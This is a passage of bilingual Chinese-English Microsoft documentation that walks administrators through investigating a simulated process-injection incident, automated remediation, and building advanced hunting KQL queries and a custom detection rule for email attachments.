<span data-ttu-id="2a198-225">例如，向下滚动，直到发现警报事件 **可疑进程注入被观测到**。</span><span class="sxs-lookup"><span data-stu-id="2a198-225">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="2a198-226">单击 " **powershell.exe 注入到** 它下面的 notepad.exe 处理事件"，以在侧窗格上的 " **事件实体** " 图中显示此行为的完整进程树。</span><span class="sxs-lookup"><span data-stu-id="2a198-226">Click the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="2a198-227">如有必要，请使用搜索栏进行筛选。</span><span class="sxs-lookup"><span data-stu-id="2a198-227">Use the search bar for filtering if necessary.</span></span>

![选定 PowerShell 文件创建行为的进程树的屏幕截图](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="2a198-229">查看用户信息 [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="2a198-229">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="2a198-230">在 "事件" 页上，单击 " **用户** " 选项卡以显示攻击涉及的用户列表。</span><span class="sxs-lookup"><span data-stu-id="2a198-230">On the incident page, click the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="2a198-231">该表包含有关每个用户的其他信息，包括每个用户的 **调查优先级** 分数。</span><span class="sxs-lookup"><span data-stu-id="2a198-231">The table contains additional information about each user, including each user’s **Investigation Priority** score.</span></span>

<span data-ttu-id="2a198-232">单击用户名可打开用户的配置文件页面，可以在其中执行进一步调查。</span><span class="sxs-lookup"><span data-stu-id="2a198-232">Click the username to open the user’s profile page where further investigation can be conducted.</span></span> <span data-ttu-id="2a198-233">[阅读有关调查有风险的用户的详细信息](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify)。</span><span class="sxs-lookup"><span data-stu-id="2a198-233">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>
<br>
<span data-ttu-id="2a198-234">![云应用安全用户页面的屏幕截图](../../media/mtp/fig13.png)</span><span class="sxs-lookup"><span data-stu-id="2a198-234">![Screenshot of Cloud App Security user page](../../media/mtp/fig13.png)</span></span>


## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="2a198-235">自动调查和修复</span><span class="sxs-lookup"><span data-stu-id="2a198-235">Automated investigation and remediation</span></span>
>[!NOTE]
><span data-ttu-id="2a198-236">在我们引导你完成此模拟之前，请观看以下视频，了解自动自我修复的内容、在门户中的何处以及它如何在你的安全操作中提供帮助：</span><span class="sxs-lookup"><span data-stu-id="2a198-236">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="2a198-237">导航回 Microsoft 365 安全中心门户中的事件。</span><span class="sxs-lookup"><span data-stu-id="2a198-237">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="2a198-238">"**事件**" 页面中的 "**调查**" 选项卡显示由 Azure ATP 和 Microsoft Defender ATP 触发的自动调查。</span><span class="sxs-lookup"><span data-stu-id="2a198-238">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Azure ATP and Microsoft Defender ATP.</span></span> <span data-ttu-id="2a198-239">下面的屏幕截图仅显示由 Microsoft Defender ATP 触发的自动调查。</span><span class="sxs-lookup"><span data-stu-id="2a198-239">The screenshot below displays only the automated investigation triggered by Microsoft Defender ATP.</span></span> <span data-ttu-id="2a198-240">默认情况下，Microsoft Defender ATP 将自动 remediates 在队列中找到的、需要修正的项目。</span><span class="sxs-lookup"><span data-stu-id="2a198-240">By default, Microsoft Defender ATP automatically remediates the artifacts found in the queue which requires remediation.</span></span>

![与事件相关的自动调查的屏幕截图](../../media/mtp/fig14.png)

<span data-ttu-id="2a198-242">单击触发调查的警报以打开 **调查详细信息** 页面。</span><span class="sxs-lookup"><span data-stu-id="2a198-242">Click the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="2a198-243">你将看到以下内容：</span><span class="sxs-lookup"><span data-stu-id="2a198-243">You’ll see the following:</span></span>
- <span data-ttu-id="2a198-244">触发自动调查的警报 (s) 。</span><span class="sxs-lookup"><span data-stu-id="2a198-244">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="2a198-245">受影响的用户和设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-245">Impacted users and devices.</span></span> <span data-ttu-id="2a198-246">如果在其他设备上发现指示器，则还会列出这些其他设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-246">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="2a198-247">证据列表。</span><span class="sxs-lookup"><span data-stu-id="2a198-247">List of evidence.</span></span> <span data-ttu-id="2a198-248">找到并分析的实体，如文件、进程、服务、驱动程序和网络地址。</span><span class="sxs-lookup"><span data-stu-id="2a198-248">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="2a198-249">将对这些实体进行分析，以了解与警报的关系，并将其评级为良性或恶意。</span><span class="sxs-lookup"><span data-stu-id="2a198-249">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="2a198-250">发现威胁。</span><span class="sxs-lookup"><span data-stu-id="2a198-250">Threats found.</span></span> <span data-ttu-id="2a198-251">在调查过程中发现的已知威胁。</span><span class="sxs-lookup"><span data-stu-id="2a198-251">Known threats that are found during the investigation.</span></span>

>[!NOTE]
><span data-ttu-id="2a198-252">自动调查可能仍在运行，具体取决于计时。</span><span class="sxs-lookup"><span data-stu-id="2a198-252">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="2a198-253">在收集和分析证据并查看结果之前，请等待几分钟完成此过程。</span><span class="sxs-lookup"><span data-stu-id="2a198-253">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="2a198-254">刷新 " **调查详细信息** " 页以获取最新结果。</span><span class="sxs-lookup"><span data-stu-id="2a198-254">Refresh the **Investigation details** page to get the latest findings.</span></span>

![调查详细信息页面的屏幕截图](../../media/mtp/fig15.png)

<span data-ttu-id="2a198-256">在自动调查过程中，Microsoft Defender ATP 确定了 notepad.exe 过程，这是作为需要修正的项目之一注入的。</span><span class="sxs-lookup"><span data-stu-id="2a198-256">During the automated investigation, Microsoft Defender ATP identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="2a198-257">Microsoft Defender ATP 会在自动修正过程中自动停止可疑的过程注入。</span><span class="sxs-lookup"><span data-stu-id="2a198-257">Microsoft Defender ATP automatically stops the suspicious process injection as part of the automated remediation.</span></span> 

<span data-ttu-id="2a198-258">您可以从测试设备上的正在运行的进程列表中查看 <i>notepad.exe</i> 消失。</span><span class="sxs-lookup"><span data-stu-id="2a198-258">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="2a198-259">解决事件</span><span class="sxs-lookup"><span data-stu-id="2a198-259">Resolve the incident</span></span>

<span data-ttu-id="2a198-260">调查完成并确认为待修正后，请关闭事件。</span><span class="sxs-lookup"><span data-stu-id="2a198-260">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="2a198-261">单击 " **管理事件**"。</span><span class="sxs-lookup"><span data-stu-id="2a198-261">Click **Manage incident**.</span></span> <span data-ttu-id="2a198-262">将状态设置为 " **解决事件** "，并选择相关的分类。</span><span class="sxs-lookup"><span data-stu-id="2a198-262">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="2a198-263">一旦事件得到解决，它将关闭 Microsoft 365 安全中心和相关门户中的所有关联警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-263">Once the incident is resolved, it will close all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

!["事件" 页的屏幕截图，其中包含 "打开管理事件" 面板，可在其中单击交换机以解决事件](../../media/mtp/fig16.png) 

<br>
<span data-ttu-id="2a198-265">这将封装针对事件管理和自动调查和修正方案的攻击模拟。</span><span class="sxs-lookup"><span data-stu-id="2a198-265">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="2a198-266">下一次模拟将为你获取潜在恶意文件的主动威胁搜索。</span><span class="sxs-lookup"><span data-stu-id="2a198-266">The next simulation will take you through proactive threat hunting for potentially-malicious files.</span></span> 

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="2a198-267">高级搜寻方案</span><span class="sxs-lookup"><span data-stu-id="2a198-267">Advanced hunting scenario</span></span>

>[!NOTE]
><span data-ttu-id="2a198-268">在我们引导你完成模拟之前，请观看以下视频，了解高级搜寻概念，了解在门户中可以找到它的位置，并了解如何帮助你完成安全操作：</span><span class="sxs-lookup"><span data-stu-id="2a198-268">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="2a198-269">求职环境要求</span><span class="sxs-lookup"><span data-stu-id="2a198-269">Hunting environment requirements</span></span>
<span data-ttu-id="2a198-270">此方案需要一个内部邮箱和一个设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-270">There is a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="2a198-271">您还需要一个外部电子邮件帐户来发送测试邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-271">You will also need an external email account to send the test message.</span></span>

1.  <span data-ttu-id="2a198-272">验证你的租户是否已 [启用 Microsoft 威胁防护](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。</span><span class="sxs-lookup"><span data-stu-id="2a198-272">Verify that your tenant has [enabled Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2.  <span data-ttu-id="2a198-273">确定要用于接收电子邮件的目标邮箱。</span><span class="sxs-lookup"><span data-stu-id="2a198-273">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="2a198-274">a.</span><span class="sxs-lookup"><span data-stu-id="2a198-274">a.</span></span>  <span data-ttu-id="2a198-275">此邮箱必须由 Office 365 ATP b 监视。</span><span class="sxs-lookup"><span data-stu-id="2a198-275">This mailbox must be monitored by Office 365 ATP b.</span></span>  <span data-ttu-id="2a198-276">要求3中的设备需要访问此邮箱</span><span class="sxs-lookup"><span data-stu-id="2a198-276">The device from requirement 3 needs to access this mailbox</span></span>
3.  <span data-ttu-id="2a198-277">配置测试设备：。</span><span class="sxs-lookup"><span data-stu-id="2a198-277">Configure a test device: a.</span></span>  <span data-ttu-id="2a198-278">请确保使用的是 Windows 10 版本1903或更高版本。</span><span class="sxs-lookup"><span data-stu-id="2a198-278">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="2a198-279">b.</span><span class="sxs-lookup"><span data-stu-id="2a198-279">b.</span></span>  <span data-ttu-id="2a198-280">将测试设备加入测试域。</span><span class="sxs-lookup"><span data-stu-id="2a198-280">Join the test device to the test domain.</span></span>
    <span data-ttu-id="2a198-281">c.</span><span class="sxs-lookup"><span data-stu-id="2a198-281">c.</span></span>  <span data-ttu-id="2a198-282">[启用 Windows Defender 防病毒](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。</span><span class="sxs-lookup"><span data-stu-id="2a198-282">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="2a198-283">如果你在启用 Windows Defender 防病毒时遇到问题，请参阅 [此故障排除主题](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。</span><span class="sxs-lookup"><span data-stu-id="2a198-283">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="2a198-284">d.</span><span class="sxs-lookup"><span data-stu-id="2a198-284">d.</span></span>  <span data-ttu-id="2a198-285">[板载到 Microsoft Defender 高级威胁防护 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。</span><span class="sxs-lookup"><span data-stu-id="2a198-285">[Onboard to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="2a198-286">运行模拟</span><span class="sxs-lookup"><span data-stu-id="2a198-286">Run the simulation</span></span>
1.  <span data-ttu-id="2a198-287">从外部电子邮件帐户向 "测试环境要求" 部分的步骤2中标识的邮箱发送电子邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-287">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="2a198-288">包含将允许通过任何现有电子邮件筛选器策略的附件。</span><span class="sxs-lookup"><span data-stu-id="2a198-288">Include an attachment that will be allowed through any existing email filter policies.</span></span>  <span data-ttu-id="2a198-289">此文件不需要是恶意的或可执行文件。</span><span class="sxs-lookup"><span data-stu-id="2a198-289">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="2a198-290">建议的文件类型为 <i>.pdf</i>、 <i>.exe</i> (如果允许) 或 Office 文档（如 Word 文件）。</span><span class="sxs-lookup"><span data-stu-id="2a198-290">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2.  <span data-ttu-id="2a198-291">按照 "测试环境要求" 一节的步骤3中的定义，打开配置为的设备发送的电子邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-291">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="2a198-292">打开附件或将文件保存到设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-292">Either open the attachment or save the file to the device.</span></span>


<span data-ttu-id="2a198-293">**"转到"**</span><span class="sxs-lookup"><span data-stu-id="2a198-293">**Go hunting**</span></span>
1.  <span data-ttu-id="2a198-294">打开 security.microsoft.com 门户。</span><span class="sxs-lookup"><span data-stu-id="2a198-294">Open the security.microsoft.com portal.</span></span>
2.  <span data-ttu-id="2a198-295">导航到 " **> 高级搜寻**" 中的 "搜寻"。</span><span class="sxs-lookup"><span data-stu-id="2a198-295">Navigate to **Hunting > Advanced hunting**.</span></span>

    ![M365 安全中心门户导航栏中高级搜寻的屏幕截图](../../media/mtp/fig17.png) 

3.  <span data-ttu-id="2a198-297">生成通过收集电子邮件事件开始的查询。</span><span class="sxs-lookup"><span data-stu-id="2a198-297">Build a query that starts by gathering email events.</span></span>
    <span data-ttu-id="2a198-298">a.</span><span class="sxs-lookup"><span data-stu-id="2a198-298">a.</span></span>  <span data-ttu-id="2a198-299">在查询窗格中，选择 "新建"。</span><span class="sxs-lookup"><span data-stu-id="2a198-299">From the query pane, select New.</span></span>
    <span data-ttu-id="2a198-300">b.</span><span class="sxs-lookup"><span data-stu-id="2a198-300">b.</span></span>  <span data-ttu-id="2a198-301">在架构中，双击 "EmailEvents" 表。</span><span class="sxs-lookup"><span data-stu-id="2a198-301">Double-click on the EmailEvents table from the schema.</span></span>

```
EmailEvents 
```                                        

   <span data-ttu-id="2a198-302">c.</span><span class="sxs-lookup"><span data-stu-id="2a198-302">c.</span></span>   <span data-ttu-id="2a198-303">将时间范围更改为最近24小时。</span><span class="sxs-lookup"><span data-stu-id="2a198-303">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="2a198-304">假定运行上述模拟时发送的电子邮件为过去的24小时，则更改时间范围。</span><span class="sxs-lookup"><span data-stu-id="2a198-304">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>
   <span data-ttu-id="2a198-305">![可在其中更改时间范围的屏幕截图。</span><span class="sxs-lookup"><span data-stu-id="2a198-305">![Screenshot of where you can change the time frame.</span></span> <span data-ttu-id="2a198-306">打开下拉菜单以从 "时间框架的范围" 选项中选择](../../media/mtp/fig18.png)</span><span class="sxs-lookup"><span data-stu-id="2a198-306">Open the drop-down menu to choose from range of time frame options](../../media/mtp/fig18.png)</span></span> 


   <span data-ttu-id="2a198-307">d.</span><span class="sxs-lookup"><span data-stu-id="2a198-307">d.</span></span>   <span data-ttu-id="2a198-308">运行查询。</span><span class="sxs-lookup"><span data-stu-id="2a198-308">Run the query.</span></span>  <span data-ttu-id="2a198-309">你可能会有许多结果，具体取决于试点的环境。</span><span class="sxs-lookup"><span data-stu-id="2a198-309">You may have many results depending on the environment for the pilot.</span></span>  

>[!NOTE]
><span data-ttu-id="2a198-310">有关筛选选项以限制数据返回的详细步骤，请参阅下一步。</span><span class="sxs-lookup"><span data-stu-id="2a198-310">See the next step for filtering options to limit data return.</span></span>

   ![高级搜寻查询结果的屏幕截图](../../media/mtp/fig19.png) 

>[!NOTE]
><span data-ttu-id="2a198-312">高级搜寻将查询结果显示为表格数据。</span><span class="sxs-lookup"><span data-stu-id="2a198-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="2a198-313">您还可以选择查看其他格式类型（如图表）中的数据。</span><span class="sxs-lookup"><span data-stu-id="2a198-313">You can also opt to view the data in other format types such as charts.</span></span>    

   <span data-ttu-id="2a198-314">e.</span><span class="sxs-lookup"><span data-stu-id="2a198-314">e.</span></span>   <span data-ttu-id="2a198-315">查看结果，并查看是否可以识别您打开的电子邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-315">Look at the results and see if you can identify the email you opened.</span></span>  <span data-ttu-id="2a198-316">最长可能需要2小时的时间才能在高级搜寻中显示邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-316">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="2a198-317">如果电子邮件环境很大且结果很多，则可能需要使用 " **显示筛选器" 选项** 来查找邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-317">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span> 

   <span data-ttu-id="2a198-318">在示例中，电子邮件是从 Yahoo 帐户发送的。</span><span class="sxs-lookup"><span data-stu-id="2a198-318">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="2a198-319">单击 **+** "SenderFromDomain" 部分下 " **yahoo.com** " 旁边的图标，然后单击 " **应用** " 将所选的域添加到查询中。</span><span class="sxs-lookup"><span data-stu-id="2a198-319">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span>  <span data-ttu-id="2a198-320">应使用在运行模拟以筛选结果的步骤1中用于发送测试邮件的域或电子邮件帐户。</span><span class="sxs-lookup"><span data-stu-id="2a198-320">You should use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span>  <span data-ttu-id="2a198-321">再次运行查询以获取一个较小的结果集，以验证您是否可以从模拟中看到该消息。</span><span class="sxs-lookup"><span data-stu-id="2a198-321">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>
   
   ![筛选器的屏幕截图。](../../media/mtp/fig20.png) 


```
EmailEvents 
| where SenderMailFromDomain == "yahoo.com"
```

   <span data-ttu-id="2a198-324">f.</span><span class="sxs-lookup"><span data-stu-id="2a198-324">f.</span></span>   <span data-ttu-id="2a198-325">单击查询中的结果行，以便您可以检查记录。</span><span class="sxs-lookup"><span data-stu-id="2a198-325">Click the resulting rows from the query so you can inspect the record.</span></span>
   <span data-ttu-id="2a198-326">![当选择高级搜索结果时，将打开的检查记录侧面板的屏幕截图](../../media/mtp/fig21.png)</span><span class="sxs-lookup"><span data-stu-id="2a198-326">![Screenshot of the inspect record side panel which opens up when an advanced hunting result is selected](../../media/mtp/fig21.png)</span></span> 


4.  <span data-ttu-id="2a198-327">现在，您已经验证您可以看到电子邮件，添加了附件的筛选器。</span><span class="sxs-lookup"><span data-stu-id="2a198-327">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="2a198-328">将重点放在环境中具有附件的所有电子邮件上。</span><span class="sxs-lookup"><span data-stu-id="2a198-328">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="2a198-329">在这种情况下，重点关注的是入站电子邮件，而不是从您的环境发出的电子邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-329">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="2a198-330">删除您已添加的任何筛选器，以查找您的邮件并添加 "|其中， **AttachmentCount > 0**和**EmailDirection**  ==  **"Inbound" "**</span><span class="sxs-lookup"><span data-stu-id="2a198-330">Remove any filters you have added to locate your message and add “| where **AttachmentCount > 0** and **EmailDirection** == **“Inbound””**</span></span>

<span data-ttu-id="2a198-331">以下查询将向您显示结果与所有电子邮件事件的初始查询的列表相比：</span><span class="sxs-lookup"><span data-stu-id="2a198-331">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"

```

5.  <span data-ttu-id="2a198-332">接下来，包括有关附件的信息 (例如：文件名、哈希) 到结果集。</span><span class="sxs-lookup"><span data-stu-id="2a198-332">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="2a198-333">若要执行此操作，请加入 **EmailAttachmentInfo** 表。</span><span class="sxs-lookup"><span data-stu-id="2a198-333">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="2a198-334">用于加入的公共字段，在此示例中为 **NetworkMessageId** 和 **RecipientObjectId**。</span><span class="sxs-lookup"><span data-stu-id="2a198-334">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

<span data-ttu-id="2a198-335">以下查询还包括其他行 "| **project-Rename EmailTimestamp = Timestamp**"，它将帮助识别与您将在下一步中添加的文件操作相关的电子邮件和时间戳相关的时间戳。</span><span class="sxs-lookup"><span data-stu-id="2a198-335">The following query also includes an additional line “| **project-rename EmailTimestamp=Timestamp**” that will help identify which timestamp was related to the email versus timestamps related to file actions which you will add in the next step.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
```

6.  <span data-ttu-id="2a198-336">接下来，使用**EmailAttachmentInfo**表中的**SHA256**值查找该哈希的终结点) 上发生的**DeviceFileEvents** (文件操作。</span><span class="sxs-lookup"><span data-stu-id="2a198-336">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span>  <span data-ttu-id="2a198-337">此处的公共字段将成为附件的 SHA256 哈希。</span><span class="sxs-lookup"><span data-stu-id="2a198-337">The common field here will be the SHA256 hash for the attachment.</span></span>

<span data-ttu-id="2a198-338">生成的表格现在包含来自终结点的详细信息 (Microsoft Defender ATP) 例如设备名称、在这种情况下 (执行了什么操作、筛选为仅包括 FileCreated 事件) 以及存储文件的位置。</span><span class="sxs-lookup"><span data-stu-id="2a198-338">The resulting table now includes details from the endpoint (Microsoft Defender ATP) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="2a198-339">此外，还将包括与进程关联的帐户名称。</span><span class="sxs-lookup"><span data-stu-id="2a198-339">The account name associated with the process will also be included.</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
```

<span data-ttu-id="2a198-340">现在，您已创建一个查询，该查询将标识用户在其中打开或保存了附件的所有入站电子邮件。</span><span class="sxs-lookup"><span data-stu-id="2a198-340">You have now created a query that will identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="2a198-341">您还可以优化此查询以筛选特定的发件人域、文件大小、文件类型等。</span><span class="sxs-lookup"><span data-stu-id="2a198-341">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7.  <span data-ttu-id="2a198-342">函数是一种特殊的联接，可让您获取有关文件的更多 TI 数据，如文件的流行、签名者信息等。 若要获取有关该文件的更多详细信息，请使用 \*\*FileProfile ( # B1 \*\* function 扩充：</span><span class="sxs-lookup"><span data-stu-id="2a198-342">Functions are a special sort of join which let you pull more TI data about a file like its prevalence, signer and issuer info, etc.  To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

```
EmailEvents 
| where AttachmentCount > 0 and EmailDirection == "Inbound"
| project-rename EmailTimestamp=Timestamp 
| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
| join DeviceFileEvents on SHA256 
| where ActionType == "FileCreated"
| distinct SHA1
| invoke FileProfile()
```


<span data-ttu-id="2a198-343">**创建检测**</span><span class="sxs-lookup"><span data-stu-id="2a198-343">**Create a detection**</span></span>

<span data-ttu-id="2a198-344">一旦创建了标识信息的查询，如果将来发生这些信息， **get alerted**就可以从查询中创建自定义检测。</span><span class="sxs-lookup"><span data-stu-id="2a198-344">Once you have created a query that identifies information that you would like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span> 

<span data-ttu-id="2a198-345">自定义检测将根据您设置的频率运行查询，并且查询的结果将根据所选的受影响的资产创建安全警报。</span><span class="sxs-lookup"><span data-stu-id="2a198-345">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="2a198-346">这些警报将与事件相关联，并且可以作为其中一个产品所生成的任何其他安全警报进行会审。</span><span class="sxs-lookup"><span data-stu-id="2a198-346">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="2a198-347">在 "查询" 页上，删除 "转出说明" 的步骤7中添加的第7行和第8行，然后单击 " **创建检测规则**"。</span><span class="sxs-lookup"><span data-stu-id="2a198-347">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![可在 "高级搜寻" 页面中单击 "创建检测规则" 的位置的屏幕截图](../../media/mtp/fig22.png) 

>[!NOTE]
><span data-ttu-id="2a198-349">如果单击 " **创建检测规则** " 并在查询中出现语法错误，则不会保存您的检测规则。</span><span class="sxs-lookup"><span data-stu-id="2a198-349">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="2a198-350">请仔细检查您的查询以确保没有错误。</span><span class="sxs-lookup"><span data-stu-id="2a198-350">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="2a198-351">填写必需的字段，其中包含的信息将允许安全团队了解警报、生成它的原因以及预期采取的操作。</span><span class="sxs-lookup"><span data-stu-id="2a198-351">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    !["创建检测规则" 页的屏幕截图，可在其中定义警报详细信息](../../media/mtp/fig23.png)

<span data-ttu-id="2a198-353">确保明确填写字段，以帮助下一用户获得有关此检测规则警报的明智决策</span><span class="sxs-lookup"><span data-stu-id="2a198-353">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="2a198-354">选择此通知中受影响的实体。</span><span class="sxs-lookup"><span data-stu-id="2a198-354">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="2a198-355">在这种情况下，选择 " **设备** 和 **邮箱**"。</span><span class="sxs-lookup"><span data-stu-id="2a198-355">In this case, select **Device** and **Mailbox**.</span></span>

    !["创建检测规则" 页的屏幕截图，可在其中选择受影响实体的参数](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="2a198-357">确定触发警报时应进行的操作。</span><span class="sxs-lookup"><span data-stu-id="2a198-357">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="2a198-358">在这种情况下，请运行防病毒扫描，尽管可以执行其他操作。</span><span class="sxs-lookup"><span data-stu-id="2a198-358">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    !["创建检测规则" 页的屏幕截图，可在其中触发警报以帮助解决威胁时运行防病毒扫描](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="2a198-360">选择警报规则的范围。</span><span class="sxs-lookup"><span data-stu-id="2a198-360">Select the scope for the alert rule.</span></span> <span data-ttu-id="2a198-361">由于此查询涉及设备，因此设备组与此自定义检测（根据 Microsoft Defender ATP 上下文）相关。</span><span class="sxs-lookup"><span data-stu-id="2a198-361">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender ATP context.</span></span>  <span data-ttu-id="2a198-362">在创建不包含受影响的实体的设备的自定义检测时，作用域不适用。</span><span class="sxs-lookup"><span data-stu-id="2a198-362">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    !["创建检测规则" 页的屏幕截图，您可以在其中设置警报规则的作用域，以管理您对将看到的结果的预期](../../media/mtp/fig26.png) 

<span data-ttu-id="2a198-364">对于此试点，您可能希望将此规则限制为生产环境中的一小部分测试设备。</span><span class="sxs-lookup"><span data-stu-id="2a198-364">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

